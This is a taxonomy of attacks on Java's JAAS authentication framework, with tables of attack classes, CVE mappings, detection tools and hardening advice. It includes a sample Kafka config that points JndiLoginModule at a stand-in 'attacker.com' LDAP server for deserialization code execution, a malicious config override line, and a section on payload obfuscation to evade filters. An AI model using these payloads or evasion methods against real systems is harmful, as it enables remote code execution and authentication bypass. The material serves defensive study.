# JAAS (Java Authentication and Authorization Service) Attack Mutation Taxonomy

---

## Classification Structure

The Java Authentication and Authorization Service (JAAS) is Java's pluggable authentication and authorization framework, modeled after the Pluggable Authentication Module (PAM) standard. JAAS provides a layered architecture consisting of **Configuration**, **LoginContext**, **LoginModule**, **CallbackHandler**, **Subject/Principal**, and **Policy** components. Each layer presents distinct attack surfaces that can be exploited independently or chained together.

This taxonomy classifies JAAS attacks along three orthogonal axes:

- **Axis 1 (Mutation Target)**: The structural component of the JAAS framework being targeted — configuration layer, LoginModule implementations, authentication flow logic, Subject/Principal manipulation, authorization policy, or integration boundaries.
- **Axis 2 (Discrepancy Type)**: The nature of the security violation created — authentication bypass, remote code execution, privilege escalation, credential interception, denial of service, or trust boundary violation.
- **Axis 3 (Attack Scenario)**: The architectural deployment context — standalone Java applications, Java EE application servers, message brokers (Kafka, ZooKeeper), cloud-native platforms, or enterprise middleware (JBoss, WebLogic, WebSphere).

The fundamental property that makes JAAS a rich attack surface is its **pluggable architecture**: authentication logic is delegated to dynamically-loaded LoginModule classes specified in external configuration, creating a wide trust boundary between configuration, class loading, and runtime authentication logic.

### Axis 2: Cross-Cutting Discrepancy Types

| Code | Discrepancy Type | Description |
|------|-----------------|-------------|
| **D1** | Authentication Bypass | Circumventing credential validation entirely |
| **D2** | Remote Code Execution | Achieving arbitrary code execution via JAAS components |
| **D3** | Privilege Escalation | Gaining elevated permissions through Subject/Principal manipulation |
| **D4** | Credential Interception | Extracting or manipulating credentials in transit |
| **D5** | Denial of Service | Disrupting authentication/authorization availability |
| **D6** | Trust Boundary Violation | Breaking isolation between JAAS components or between JAAS and external systems |

---

## §1. Configuration Layer Attacks

JAAS configuration defines which LoginModules are loaded, their control flags (`required`, `requisite`, `sufficient`, `optional`), and module-specific options. This configuration is specified via files, system properties, or programmatic APIs, making it a high-value target.

### §1-1. Configuration File Injection

When an attacker can influence the JAAS configuration file path or content, they can redirect authentication to attacker-controlled LoginModules.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **System Property Override** | Manipulating `-Djava.security.auth.login.config` JVM argument to point to an attacker-controlled configuration file | Access to JVM startup parameters or environment variables |
| **Double-Equals Override** | Using `==` syntax in `java.security.auth.login.config` to override ALL other configuration sources, completely replacing the authentication stack | Ability to set system properties before JVM initialization |
| **Configuration URL Injection** | Injecting a remote URL into `login.config.url.N` properties in `java.security` file, causing JAAS to load configuration from an attacker-controlled server | Write access to `java.security` or ability to specify additional security properties |
| **Programmatic Configuration Override** | Calling `Configuration.setConfiguration()` to install a completely different JAAS configuration onto the JVM, overwriting any file-based configuration | Untrusted code executing in the same JVM (e.g., malicious plugins) |

**Example — System Property Override:**
```
-Djava.security.auth.login.config==file:/tmp/malicious_jaas.conf
```
The `==` causes all other login configurations to be ignored; only the attacker's file is loaded.

### §1-2. LoginModule Class Injection

Attackers can specify arbitrary LoginModule classes in JAAS configuration, causing the framework to instantiate and invoke attacker-controlled or dangerous built-in classes.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **JndiLoginModule Injection** | Specifying `com.sun.security.auth.module.JndiLoginModule` with `user.provider.url` pointing to an attacker's LDAP/RMI server, triggering JNDI lookup and deserialization of the response | Ability to set `sasl.jaas.config` property (e.g., Kafka Connect connectors) |
| **LdapLoginModule Injection** | Specifying `com.sun.security.auth.module.LdapLoginModule` with attacker-controlled LDAP server URL, triggering LDAP response deserialization | Same as JndiLoginModule; attacker-controlled LDAP connection parameters |
| **Custom Malicious LoginModule** | Placing a malicious LoginModule class on the classpath and referencing it in JAAS configuration, achieving arbitrary code execution during `initialize()`, `login()`, or `commit()` | Ability to modify classpath AND JAAS configuration |
| **LoginModule Option Injection** | Injecting malicious values into LoginModule options (e.g., `user.provider.url`, `userProvider`, `authzIdentity`) to redirect authentication backends | Partial control over JAAS configuration options |

**Example — JndiLoginModule JNDI Injection (CVE-2023-25194 pattern):**
```
sasl.jaas.config=com.sun.security.auth.module.JndiLoginModule required
  user.provider.url="ldap://attacker.com:1389/Exploit"
  useFirstPass=true;
```
The Kafka Connect worker connects to `attacker.com:1389`, deserializes the LDAP response, and executes attacker-controlled gadget chains.

### §1-3. Control Flag Manipulation

JAAS LoginModules use control flags (`required`, `requisite`, `sufficient`, `optional`) to determine authentication flow. Manipulating these flags can weaken the authentication stack.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Sufficient Flag Abuse** | Changing a weak LoginModule's flag to `sufficient` so that its success alone grants authentication, bypassing stronger modules in the stack | Configuration write access |
| **Optional Flag Downgrade** | Changing a `required` LoginModule to `optional`, making its failure non-fatal and allowing other (weaker) modules to authenticate | Configuration write access |
| **Module Ordering Manipulation** | Reordering LoginModules so that a weak/controllable module executes first with `sufficient` flag, short-circuiting the authentication stack | Configuration write access |
| **Module Removal** | Removing security-critical LoginModules (e.g., MFA modules) from the stack entirely | Configuration write access |

---

## §2. LoginModule Implementation Attacks

Built-in and custom LoginModule implementations contain vulnerabilities in their authentication logic, credential handling, and backend interactions.

### §2-1. Built-in LoginModule Vulnerabilities

JDK ships with several LoginModules that have known security issues.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **LDAPLoginModule Empty Password Bypass** | The `LDAPLoginModule` in Apache ActiveMQ 5.x before 5.10.1 performs an LDAP unauthenticated bind when an empty password is provided with a valid username, treating the bind as successful (CVE-2014-3612) | LDAP server allows anonymous/unauthenticated bind |
| **JndiLoginModule JNDI Lookup RCE** | `JndiLoginModule` performs JNDI lookups to directory services during authentication, which can trigger deserialization of untrusted data from remote LDAP/RMI servers | Attacker can control JNDI provider URL |
| **LdapLoginModule Deserialization RCE** | `LdapLoginModule` deserializes LDAP response attributes, enabling gadget chain execution when connected to a malicious LDAP server (CVE-2025-27818) | Attacker can redirect LDAP connection; exploitable gadget classes on classpath |
| **Krb5LoginModule Keytab Exposure** | `Krb5LoginModule` with `useKeyTab=true` and `storeKey=true` loads and caches the Kerberos key from the keytab file, potentially exposing long-term credentials in JVM memory | Keytab accessible to the JVM process; memory dump or heap inspection possible |

### §2-2. Custom LoginModule Coding Vulnerabilities

Custom LoginModule implementations frequently contain insecure patterns.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Return-False-Instead-of-Throw** | Custom LoginModule returns `false` from `login()` instead of throwing `LoginException` on failure. When the module's flag is `optional` or `sufficient`, returning `false` causes the module to be "ignored" rather than treated as a failure, potentially allowing authentication to succeed | Custom LoginModule with incorrect error handling |
| **Fail-Open Exception Handling** | LoginModule catches only specific exceptions (e.g., `LoginException`) but not broader exceptions (e.g., `IOException`). Uncaught exceptions cause authentication to fail open (CVE-2023-25561 pattern) | Overly narrow exception handling in authentication logic |
| **SQL/LDAP Injection in Credential Lookup** | Custom LoginModule constructs SQL or LDAP queries using unsanitized username/password input from CallbackHandler, enabling injection attacks | Database-backed or LDAP-backed custom LoginModule without parameterized queries |
| **Plaintext Credential Storage** | LoginModule stores or logs passwords in plaintext during the authentication lifecycle (in shared state, debug output, or application logs) | Debug mode enabled, shared state accessible to other modules |
| **Missing Abort Cleanup** | LoginModule's `abort()` method fails to securely clear credentials from memory (username, password fields, shared state), leaving sensitive data accessible after failed authentication | Standard garbage collection; no explicit zeroing of credential arrays |
| **Race Condition in Two-Phase Commit** | JAAS uses a two-phase authentication (login + commit). If state between phases is mutable and shared, concurrent authentication attempts can interfere with each other | Multi-threaded authentication in application servers |

### §2-3. Backend Protocol Attacks via LoginModule

LoginModules interact with external authentication backends, creating injection and interception opportunities.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **LDAP Injection via Username** | Attacker crafts a username containing LDAP filter metacharacters (e.g., `*`, `)(`, `\00`) to manipulate the LDAP search query constructed by `LdapLoginModule` | LoginModule constructs LDAP queries without proper escaping |
| **Kerberos Ticket Manipulation** | Exploiting weaknesses in `Krb5LoginModule`'s ticket validation, such as forging service tickets when the KDC uses weak encryption types (e.g., RC4-HMAC/DES) | Weak Kerberos encryption types enabled; attacker on the network |
| **JNDI Protocol Smuggling** | Using alternative JNDI URL schemes (`rmi://`, `ldap://`, `dns://`, `iiop://`) in LoginModule configuration to reach different types of remote services and trigger various deserialization paths | LoginModule accepts arbitrary JNDI URLs without scheme restriction |
| **Man-in-the-Middle on Backend** | Intercepting communication between LoginModule and authentication backend (LDAP, Kerberos KDC, database) when TLS is not enforced | Non-TLS connection to authentication backend; attacker on network path |

---

## §3. Authentication Flow Logic Attacks

These attacks target the JAAS authentication flow itself — the interactions between `LoginContext`, `LoginModule` stack, `CallbackHandler`, and the two-phase commit protocol.

### §3-1. CallbackHandler Manipulation

The `CallbackHandler` mediates between the application and LoginModules for gathering credentials. Insecure CallbackHandler implementations create interception opportunities.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **CallbackHandler Replacement** | Replacing the application's CallbackHandler with a malicious one that logs or modifies credentials before passing them to LoginModules | Ability to supply a custom CallbackHandler to `LoginContext` |
| **Callback Type Confusion** | Sending unexpected Callback types to the handler, causing it to fail or expose internal state through error messages | Custom CallbackHandler with inadequate type checking |
| **Credential Interception in SharedState** | When `useFirstPass` or `tryFirstPass` is configured, credentials are stored in the `sharedState` map accessible to all LoginModules in the stack. A malicious or compromised LoginModule can read these credentials | Multiple LoginModules in stack with shared state enabled |
| **Prompt Injection via Callback** | In GUI-based or web-based CallbackHandler implementations, injecting malicious content through callback prompts (e.g., `TextOutputCallback` messages) to perform social engineering | LoginModule controls callback prompt strings |

### §3-2. Two-Phase Commit Protocol Exploitation

JAAS authentication uses a two-phase protocol: `login()` then `commit()` (or `abort()`). Inconsistencies between phases create windows of opportunity.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **State Desynchronization** | Manipulating shared state between `login()` and `commit()` phases so that a different Subject/Principal is committed than what was authenticated | Concurrent access to shared state; race condition in multi-threaded environments |
| **Partial Commit Exploitation** | When one LoginModule commits but another aborts, the overall authentication state may be inconsistent, leaving partial Principals attached to the Subject | Multi-module stack with mixed `required`/`optional` flags and differing failure modes |
| **Abort-Phase Information Leak** | The `abort()` method may fail to clean up fully, leaving authentication artifacts (partial Principals, cached credentials) in the Subject or shared state | Improper `abort()` implementation |

### §3-3. HTTP Method-Based Authentication Bypass

When JAAS is used in Java EE web applications with security constraints, HTTP method restrictions can be exploited.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Uncovered HTTP Method Bypass** | Security constraints defined only for GET and POST methods allow attackers using HEAD, PUT, DELETE, OPTIONS, or TRACE to bypass JAAS-protected resources entirely | `<http-method>` elements in `web.xml` list only specific methods instead of omitting them (which defaults to all methods) |
| **Method Override Header Injection** | Using `X-HTTP-Method-Override` or similar headers to change the effective HTTP method after the security constraint check but before the actual handler processes the request | Application server processes method override headers after security checks |

---

## §4. Subject and Principal Manipulation

After successful authentication, the authenticated identity is represented as a `Subject` containing `Principal` objects. Manipulating these at runtime enables privilege escalation.

### §4-1. Subject Mutability Attacks

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Principal Injection** | Adding unauthorized Principal objects to an authenticated Subject's Principal set to gain additional roles or privileges | Reference to Subject object; Subject not marked read-only |
| **Principal Removal** | Removing high-privilege-requiring Principals from a Subject to simplify it to match a broader permission set | Subject not marked read-only |
| **Credential Set Manipulation** | Adding or modifying objects in the Subject's public/private credential sets to impersonate different identities or escalate privileges | Access to Subject credential sets; Subject not marked read-only |
| **Subject Serialization/Deserialization** | Serializing a Subject, modifying its serialized form (Principal set, credential sets), and deserializing it to create a tampered authenticated identity | Application serializes/deserializes Subject objects (e.g., in distributed sessions) |

### §4-2. doAs / doPrivileged Exploitation

JAAS uses `Subject.doAs()` and `Subject.doAsPrivileged()` to execute code with a Subject's permissions.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **doAs with Forged Subject** | Calling `Subject.doAs()` with an attacker-constructed Subject containing arbitrary Principals, executing privileged code with fabricated identity | Ability to execute code in JVM; Subject construction is not restricted |
| **doAsPrivileged Null Context** | `Subject.doAsPrivileged(subject, action, null)` uses a null `AccessControlContext`, meaning permissions are checked only against the Subject's Principals and the code's `ProtectionDomain`, not the full call stack — potentially bypassing caller permission checks | Application uses `doAsPrivileged` with null context |
| **doPrivileged within doAs Block** | A `doPrivileged()` call inside a `Subject.doAs()` block severs the Subject association from the AccessControlContext, causing authorization checks to miss the Subject's Principal-based permissions — leading to unexpected access denials or, conversely, allowing code to escape Subject-based restrictions | Complex call stacks mixing doAs and doPrivileged |

---

## §5. Authorization Policy Attacks

JAAS authorization relies on Java policy files that grant permissions based on code source and Principal identity. Manipulating these policies enables privilege escalation.

### §5-1. Policy File Manipulation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Policy File Injection** | Modifying `java.security.policy` system property to point to an attacker-controlled policy file that grants `AllPermission` to attacker code | Access to JVM startup parameters |
| **Principal Wildcard Abuse** | Crafting policy entries with overly broad Principal matching (e.g., `Principal * *`) that grants permissions to any authenticated entity regardless of identity | Misconfigured policy file |
| **CodeSource + Principal Intersection Bypass** | Exploiting the intersection semantics of CodeSource and Principal-based grants to find combinations that yield more permissions than intended | Complex policy with both code-source and Principal grants |
| **Dynamic Policy Provider Replacement** | Replacing the system `Policy` object via `Policy.setPolicy()` with a permissive custom implementation | Untrusted code running in the same JVM |

### §5-2. Security Manager Interaction (Legacy)

Note: The Security Manager has been deprecated since Java 17 (JEP 411) and permanently disabled in Java 24 (JEP 486). These attacks apply to legacy Java versions.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Security Manager Bypass via Reflection** | Using reflection to access restricted JAAS internals (e.g., Subject fields, LoginModule state) when Security Manager policies don't adequately restrict `java.lang.reflect` permissions | Security Manager present but with insufficient reflection restrictions |
| **Permission Check Elevation** | Exploiting the interaction between `AccessController.doPrivileged()` and JAAS `Subject.doAs()` to execute code with combined permissions from both the code's ProtectionDomain and the Subject's Principals | Complex security policy; legacy Security Manager environment |

---

## §6. Integration Boundary Attacks

JAAS is integrated into numerous Java platforms and middleware. Each integration point creates unique attack surfaces at trust boundaries.

### §6-1. Message Broker Integration (Kafka, ZooKeeper)

The most actively exploited JAAS attack surface involves message brokers that expose JAAS configuration through client-facing APIs.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Kafka Connect SASL JAAS Config Injection** | Authenticated Kafka Connect users with connector create/modify permissions inject malicious `sasl.jaas.config` property specifying `JndiLoginModule` or `LdapLoginModule` with attacker LDAP server URL, triggering deserialization RCE (CVE-2023-25194) | Kafka Connect 2.3.0–3.3.2; connector management access |
| **Kafka Broker Config Override** | Authenticated users with `AlterConfigs` permission on the cluster resource modify broker-level SASL JAAS configuration to inject malicious LoginModules (CVE-2025-27819) | Kafka brokers 2.3.0–3.9.0; AlterConfigs ACL |
| **Kafka Producer/Consumer Override** | Using `producer.override.sasl.jaas.config`, `consumer.override.sasl.jaas.config`, or `admin.override.sasl.jaas.config` properties to inject LoginModule configuration through connector definitions | Kafka Connect with client config overrides enabled |
| **ZooKeeper SASL JAAS Manipulation** | Manipulating ZooKeeper's JAAS configuration for SASL authentication to bypass or weaken access control on ZooKeeper nodes used by Kafka | Access to ZooKeeper JAAS configuration |

### §6-2. Application Server Integration (JBoss, WebLogic, WebSphere)

Java EE application servers wrap JAAS with their own security subsystems, creating additional attack vectors.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Security Domain Misconfiguration** | JBoss/WildFly security domains map to JAAS LoginModule stacks. Misconfiguring a security domain (e.g., wrong module order, missing `required` flag) can create authentication bypass | Application server admin access or deployment descriptor control |
| **Deployment Descriptor Override** | Overriding JAAS security settings through `jboss-web.xml`, `weblogic.xml`, or similar deployment descriptors to change the effective authentication realm | Ability to deploy or modify web application archives |
| **Login Module Stack Confusion** | Application server's JAAS integration may evaluate LoginModule stack semantics differently than standard JAAS (e.g., custom handling of `sufficient` + `required` combinations), creating unexpected bypass paths | Server-specific JAAS stack evaluation behavior |
| **Cross-Application Principal Leakage** | In shared application server environments, Principal objects from one application's JAAS authentication leaking to another application's security context via thread-local or shared Subject state | Multi-tenant application server; improper Subject cleanup |

### §6-3. Spring Security Integration

Spring Security's JAAS integration introduces its own adapter layer with potential vulnerabilities.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **JaasAuthenticationProvider Misconfiguration** | Spring Security's `JaasAuthenticationProvider` wraps JAAS but may not properly propagate all failure conditions, creating fail-open scenarios similar to CVE-2023-25561 | Spring Security with JAAS backend; inadequate error handling |
| **AuthorityGranter Manipulation** | Spring's `AuthorityGranter` maps JAAS Principals to Spring Security `GrantedAuthority` objects. Incorrect mapping logic can grant unintended authorities | Custom `AuthorityGranter` with flawed Principal-to-role mapping |
| **CallbackHandler Injection** | Spring allows configuring custom `CallbackHandler` beans. Replacing this bean in the application context injects a malicious handler into the JAAS authentication flow | Access to Spring application context or bean configuration |

### §6-4. Data Platform Integration

Data platforms and analytics tools integrate JAAS for authentication, often with configuration exposed to semi-trusted users.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **DataHub JAAS Fail-Open** | DataHub's `authenticateJaasUser` method catches only `LoginException`, causing `IOException` from malformed JAAS config to bypass authentication entirely (CVE-2023-25561) | DataHub < 0.8.45 with JAAS authentication |
| **Apache Druid JNDI Injection** | Apache Druid's use of Kafka client libraries inherits the SASL JAAS `JndiLoginModule` vulnerability, enabling RCE through Druid's Kafka ingestion configuration | Apache Druid with Kafka ingestion; user-controllable Kafka client config |
| **Solr Authentication Plugin Bypass** | Apache Solr's authentication plugins that rely on JAAS may inherit configuration-level vulnerabilities when JAAS config files are world-readable or modifiable | Solr with JAAS-backed authentication; file permission issues |

---

## §7. Payload Encoding and Evasion

Techniques for encoding or obfuscating JAAS attack payloads to bypass security controls such as WAFs, input filters, or allowlists.

### §7-1. JNDI URL Encoding Variations

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Alternative JNDI Schemes** | Using `rmi://`, `dns://`, `iiop://`, or `corba://` instead of `ldap://` in `JndiLoginModule` provider URL to bypass scheme-based allowlists | JNDI URL scheme not restricted; alternative protocol handlers available |
| **LDAP Redirect/Referral** | Using an LDAP server that returns a referral to another server, bypassing hostname-based restrictions on the initial JNDI lookup | LDAP referral following enabled (default in many implementations) |
| **IP Representation Obfuscation** | Encoding the attacker server IP in alternative formats (decimal, octal, hex, IPv6-mapped IPv4) within JNDI URLs to bypass IP-based blocklists | URL parser accepts non-standard IP representations |

### §7-2. Configuration Syntax Obfuscation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Unicode/Encoding in Config Values** | Using Unicode escapes or alternate encodings in JAAS configuration option values to bypass string-matching filters | Configuration parser processes encoded values |
| **Whitespace/Comment Injection** | Injecting comments or whitespace within JAAS configuration to split malicious values across multiple lines, evading line-based detection | Configuration parser is tolerant of non-standard formatting |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories | Typical Impact |
|----------|-------------|---------------------------|----------------|
| **Kafka/Streaming Platform RCE** | Kafka Connect, Kafka Brokers, ZooKeeper | §1-2 + §2-1 + §6-1 | Remote Code Execution, Data Exfiltration |
| **Java EE Application Auth Bypass** | JBoss, WebLogic, WebSphere, Tomcat | §1-3 + §2-2 + §3-3 + §6-2 | Authentication Bypass, Unauthorized Access |
| **Cloud-Native Platform Compromise** | DataHub, Apache Druid, Solr | §2-2 + §6-4 | Authentication Bypass, RCE |
| **Enterprise Middleware Privilege Escalation** | Application Servers, ESBs | §4-1 + §4-2 + §5-1 | Privilege Escalation, Lateral Movement |
| **Legacy Java Application Exploitation** | Java SE with Security Manager | §5-1 + §5-2 + §4-2 | Sandbox Escape, Privilege Escalation |
| **Spring-Based Application Compromise** | Spring Security + JAAS | §3-1 + §6-3 + §2-2 | Authentication Bypass, Authority Escalation |

---

## CVE / Bounty Mapping (2014–2025)

| Mutation Combination | CVE / Case | Year | Impact | CVSS |
|---------------------|-----------|------|--------|------|
| §1-2 + §2-1 + §6-1 | CVE-2023-25194 (Apache Kafka Connect) | 2023 | RCE via SASL JAAS JndiLoginModule config injection | 8.8 |
| §2-1 + §6-1 | CVE-2025-27818 (Apache Kafka) | 2025 | RCE via SASL JAAS LdapLoginModule config injection | 8.8 |
| §1-2 + §6-1 | CVE-2025-27819 (Apache Kafka Brokers) | 2025 | RCE via SASL JAAS JndiLoginModule on Kafka Brokers | 8.8 |
| §2-2 (Fail-Open) + §6-4 | CVE-2023-25561 (DataHub) | 2023 | Authentication bypass via JAAS misconfiguration fail-open | 5.7 |
| §2-1 (Empty Password) | CVE-2014-3612 (Apache ActiveMQ) | 2014 | Authentication bypass via empty password LDAP unauthenticated bind | 7.5 |
| §3-1 + §6-1 | KAFKA-10895 (Apache Kafka) | 2021 | JAAS config corruption by competing plugins via `Configuration.setConfiguration()` | N/A |
| §1-2 + §6-4 | CVE-2023-25194 pattern in Apache Druid | 2023 | RCE via Kafka ingestion SASL JAAS injection | 8.8 |
| §6-2 + §3-3 | Multiple (Java EE servers) | Various | HTTP method-based JAAS authentication bypass | Medium |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **Jazzer** (Fuzzer) | Java application code, LoginModule implementations | Coverage-guided in-process JVM fuzzing with built-in bug detectors for injections |
| **CI Fuzz** (Fuzzer) | Java web applications, authentication flows | Fuzz testing integrated with JUnit, compatible with Bazel/Maven |
| **Acunetix** (Scanner) | Java web applications | Heuristic detection of JAAS authentication bypass via HTTP method enumeration |
| **Invicti** (Scanner) | Java web applications | JAAS authentication bypass detection in web application scanning |
| **OWASP ZAP** (Scanner) | Web application authentication | Active scanning for authentication bypass, HTTP method tampering |
| **Semgrep** (SAST) | Java source code | Static analysis rules for insecure LoginModule patterns (fail-open, SQL injection, plaintext credentials) |
| **SpotBugs / FindBugs** (SAST) | Java bytecode | Detection of security anti-patterns in compiled LoginModule code |
| **jndi-injection-exploit-kit** (Offensive) | JNDI injection endpoints | Automated JNDI exploitation with HTTP, RMI, and LDAP servers |
| **Metasploit** (Offensive) | Apache Druid, Kafka Connect | `exploit/multi/http/apache_druid_cve_2023_25194` module for JAAS JNDI injection |

---

## Summary: Core Principles

### The Root Cause

The fundamental property that makes JAAS a persistent and rich attack surface is its **configuration-driven class loading architecture**. JAAS was designed to decouple authentication logic from application code through dynamically-specified LoginModules — a powerful design pattern that simultaneously creates a massive trust boundary. Any system that allows users, administrators, or configurations to influence which LoginModule is loaded, what options it receives, or how its results are interpreted becomes vulnerable to class injection, JNDI exploitation, and authentication bypass.

### Why Incremental Patches Fail

Each CVE in the JAAS ecosystem addresses a specific LoginModule (JndiLoginModule, LdapLoginModule) or a specific integration point (Kafka Connect, DataHub). But the underlying architecture — externally-specified class names instantiated via reflection, configuration options passed as trusted parameters, and pluggable authentication stacks with complex control flow — remains unchanged. Disabling JndiLoginModule and LdapLoginModule (as Apache Kafka did in 3.9.1/4.0.0) only addresses the most obviously dangerous built-in modules. Custom LoginModules with JNDI lookups, insecure backend interactions, or coding errors remain outside the scope of such mitigations. The deprecation and removal of the Java Security Manager (JEP 411/486) further reduces the defense-in-depth available for restricting JAAS-related operations.

### Structural Solutions

A comprehensive defense against JAAS attacks requires:

1. **Configuration Integrity**: JAAS configuration files must be treated as security-critical, with strict file permissions, integrity monitoring, and prohibition of remote configuration sources. System property-based configuration overrides should be restricted in production environments.

2. **LoginModule Allowlisting**: Rather than blocklisting dangerous modules (the current Kafka approach with `disallowed.login.modules`), platforms should enforce strict allowlists of permitted LoginModule classes, rejecting any module not explicitly approved.

3. **Secure LoginModule Development**: Custom LoginModule implementations must follow defensive coding patterns: throwing `LoginException` on all failure paths (never returning false or silently catching exceptions), using parameterized queries for backend lookups, zeroing credential arrays after use, and properly implementing all lifecycle methods (login, commit, abort, logout).

4. **Subject Immutability**: After authentication, Subject objects should be marked read-only via `Subject.setReadOnly()` to prevent post-authentication Principal injection or credential manipulation.

5. **Integration Boundary Hardening**: Systems that expose JAAS configuration through APIs (like Kafka Connect's `sasl.jaas.config` property) must validate and restrict the configuration values at the API layer, not relying on JAAS-level security alone.

---

*This document was created for defensive security research and vulnerability understanding purposes.*

---

## References

- [OWASP JAAS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JAAS_Cheat_Sheet.html)
- [Oracle JAAS Reference Guide (Java 8)](https://docs.oracle.com/javase/8/docs/technotes/guides/security/jaas/JAASRefGuide.html)
- [Oracle LoginModule Developer's Guide](https://docs.oracle.com/javase/8/docs/technotes/guides/security/jaas/JAASLMDevGuide.html)
- [CVE-2023-25194: Apache Kafka SASL JAAS RCE](https://kafka.apache.org/cve-list.html)
- [CVE-2025-27818: Apache Kafka LdapLoginModule RCE](https://seclists.org/oss-sec/2025/q2/236)
- [CVE-2025-27819: Apache Kafka Broker JndiLoginModule RCE](https://www.mail-archive.com/dev@kafka.apache.org/msg150246.html)
- [CVE-2023-25561: DataHub JAAS Authentication Bypass](https://securitylab.github.com/advisories/GHSL-2022-076_GHSL-2022-083_DataHub/)
- [CVE-2014-3612: ActiveMQ LDAPLoginModule Empty Password](https://www.cvedetails.com/cve/CVE-2014-3612/)
- [Black Hat: JAAS - A Novel Attack Surface](https://www.classcentral.com/course/youtube-a-novel-attack-surface-java-authentication-and-authorization-service-jaas-445068)
- [SEI CERT: Java Privilege Escalation](https://wiki.sei.cmu.edu/confluence/display/java/Privilege+Escalation)
- [JEP 486: Permanently Disable the Security Manager](https://openjdk.org/jeps/486)
- [Apache Kafka Disallowed Login Modules](https://kafka.apache.org/community/cve-list/)
- [Java Security Manager Bypass (codeplutos)](https://github.com/codeplutos/java-security-manager-bypass)
- [Metasploit Apache Druid CVE-2023-25194](https://www.rapid7.com/db/modules/exploit/multi/http/apache_druid_cve_2023_25194/)
- [JNDI Injection Exploit Kit](https://github.com/pimps/JNDI-Exploit-Kit)
